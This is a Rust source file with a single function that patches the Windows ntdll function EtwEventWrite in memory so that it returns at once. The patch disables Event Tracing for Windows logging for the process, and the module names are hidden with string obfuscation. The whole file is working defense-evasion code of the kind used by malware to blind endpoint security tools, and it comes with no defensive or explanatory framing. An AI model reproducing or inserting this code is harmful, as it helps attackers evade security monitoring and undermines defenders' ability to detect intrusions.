use obfstr::obfstr;
use std::ptr::copy_nonoverlapping;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READWRITE, VirtualProtect};

pub fn patch_etw() {
    unsafe {
        // xor eax, eax; ret
        let hook = [0x33, 0xC0, 0xC3];

        let ntdll_handle = GetModuleHandleA(obfstr!("ntdll.dll").as_ptr());

        let target_address = GetProcAddress(ntdll_handle, obfstr!("EtwEventWrite").as_ptr().cast())
            .unwrap() as *mut u8;

        // Change memory protection
        let mut old_protection = 0;
        VirtualProtect(
            target_address.cast(),
            hook.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        );

        // Patch
        copy_nonoverlapping(hook.as_ptr(), target_address, hook.len());

        // Restore memory protection
        VirtualProtect(
            target_address.cast(),
            hook.len(),
            old_protection,
            &mut old_protection,
        );
    }
}
